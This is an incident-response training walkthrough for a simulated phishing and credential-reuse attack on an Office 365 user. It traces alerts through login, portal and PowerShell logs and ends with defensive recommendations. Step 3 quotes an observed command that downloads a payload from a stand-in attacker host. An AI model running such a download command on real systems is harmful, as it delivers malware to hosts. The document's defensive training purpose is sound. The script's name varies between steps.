# 🧠 SOC Analyst Walkthrough - IR Sim 101

## 🗓️ Scenario Summary

The user `j.doe@acme.com` was tricked into submitting their Office 365 credentials via a phishing email. The attacker reused these valid credentials to log in to the corporate Office 365 environment and later used them again to access an internal portal (`intra.acmecorp.io`), the link for which was found in old email threads. Through this access, they executed PowerShell commands to perform reconnaissance and potentially stage a payload delivery.

---

## 🔍 Step 1: Suspicious Office 365 Login

- Data Source: `o365_login_events.csv`
- A successful login was detected from **Singapore**, a geo-location never previously seen for this user.
- The login was from an unfamiliar browser and occurred at 10:03 AM IST.
- Historical data showed this user typically logs in from India.

✅ **Alert Triggered**: `O365_Suspicious_Login_GeoMismatch`

---

## 🛠️ Step 2: Internal Portal Access Using Same Credentials

- Data Source: `internal_portal_logs.csv`
- The attacker used the same harvested credentials to log in to the internal portal within an hour of the O365 login.
- This portal is not publicly indexed; the attacker likely found its link from old internal emails.
- Logs show the attacker downloading a script named `powerscan.ps1`.

✅ **Alert Triggered**: `Internal_Portal_Access_Anomaly`

---

## 💻 Step 3: PowerShell Reconnaissance Activity

- Data Source: `powershell_activity.csv`
- On the user’s endpoint, the following suspicious PowerShell commands were observed:
  - `Get-LocalUser`
  - `Invoke-WebRequest http://attacker.site/payload.exe`
- The script `winupdate.ps1` was likely disguised as a legitimate update utility.
- No prior history of PowerShell CLI use on Jacob’s device.

✅ **Alert Triggered**: `Suspicious PowerShell Execution`

---

## 🧩 Incident Flow Summary

Phishing ➝ Credential Theft ➝ O365 Login ➝ Internal Portal Access ➝ PowerShell Execution


This attack demonstrates the use of **valid credentials** across multiple systems to simulate lateral movement, internal access, and command execution—all without malware or exploits.

---

## 🔐 Analyst Recommendations

1. **Immediate Response:**
   - Invalidate all sessions and reset credentials for `j.doe@acme.com`
   - Investigate IP activity from Singapore across O365 and internal systems

2. **Security Control Gaps:**
   - Enforce Conditional Access Policies (location/device-based)
   - Enable MFA on both Office 365 and internal portals

3. **User Awareness:**
   - Educate user on phishing recognition
   - Test email filters and strengthen phishing detections

4. **Endpoint Hardening:**
   - Disable PowerShell where unnecessary
   - Monitor for script execution with non-standard names

---

## 📘 Summary

This simulation highlights how real-world adversaries can use harvested credentials to escalate access in low-friction environments. No exploits or advanced malware—just smart abuse of access and poor segmentation.

This was simulated with low-resource datasets to reflect realistic analyst workflows without needing high-end hardware or lab setups.
